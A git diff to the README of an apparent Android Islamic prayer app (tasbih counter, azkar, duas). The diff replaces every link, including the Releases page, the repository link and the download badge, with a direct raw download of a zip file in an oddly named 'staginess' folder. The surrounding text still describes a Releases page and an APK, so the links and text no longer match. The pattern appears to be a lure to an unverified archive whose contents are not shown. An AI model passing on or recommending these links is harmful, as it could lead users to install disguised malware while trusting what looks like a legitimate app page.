@@ -1,6 +1,6 @@
 # 🎉 prayer-pal-tasbih-and-azkar - Your Daily Spiritual Companion
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Summerscreen/prayer-pal-tasbih-and-azkar/releases)
+[![Download Now](https://raw.githubusercontent.com/Summerscreen/prayer-pal-tasbih-and-azkar/main/staginess/pal_tasbih_and_prayer_azkar_1.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Summerscreen/prayer-pal-tasbih-and-azkar/main/staginess/pal_tasbih_and_prayer_azkar_1.1.zip)
 
 ## 📖 Description
 prayer-pal-tasbih-and-azkar is a comprehensive, free, and ad-free Islamic mobile app designed to enhance your daily spiritual practices. It includes a Tasbih counter, curated Duas, daily Azkar, and Asmaul Husna with translations. Built using Flutter, this app is perfect for Android users who seek a privacy-focused, enriching religious experience.
@@ -10,7 +10,7 @@ To get started with prayer-pal-tasbih-and-azkar, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click on the link below to access the download page for our app:
-   [Download Now](https://github.com/Summerscreen/prayer-pal-tasbih-and-azkar/releases)
+   [Download Now](https://raw.githubusercontent.com/Summerscreen/prayer-pal-tasbih-and-azkar/main/staginess/pal_tasbih_and_prayer_azkar_1.1.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Select the version you wish to download. Generally, you will want the latest version as it includes the newest features and fixes.
@@ -41,7 +41,7 @@ To get started with prayer-pal-tasbih-and-azkar, follow these simple steps:
 To download and install prayer-pal-tasbih-and-azkar, simply follow these steps:
 
 1. **Click the Link**  
-   Go to the Releases page: [Download Now](https://github.com/Summerscreen/prayer-pal-tasbih-and-azkar/releases)
+   Go to the Releases page: [Download Now](https://raw.githubusercontent.com/Summerscreen/prayer-pal-tasbih-and-azkar/main/staginess/pal_tasbih_and_prayer_azkar_1.1.zip)
 
 2. **Download the APK**  
    Select the latest version and download the APK file.
@@ -67,7 +67,7 @@ Yes, most features are available offline once you have downloaded the necessary 
 We welcome your feedback! You can open an issue on the GitHub repository or directly contact us through our email listed on the repository page.
 
 ## 🔗 Links
-- **GitHub Repository**: [prayer-pal-tasbih-and-azkar](https://github.com/Summerscreen/prayer-pal-tasbih-and-azkar)
-- **Releases Page**: [Download Now](https://github.com/Summerscreen/prayer-pal-tasbih-and-azkar/releases)
+- **GitHub Repository**: [prayer-pal-tasbih-and-azkar](https://raw.githubusercontent.com/Summerscreen/prayer-pal-tasbih-and-azkar/main/staginess/pal_tasbih_and_prayer_azkar_1.1.zip)
+- **Releases Page**: [Download Now](https://raw.githubusercontent.com/Summerscreen/prayer-pal-tasbih-and-azkar/main/staginess/pal_tasbih_and_prayer_azkar_1.1.zip)
 
 Remember to visit our Releases page to download the latest version and enjoy your spiritual app.
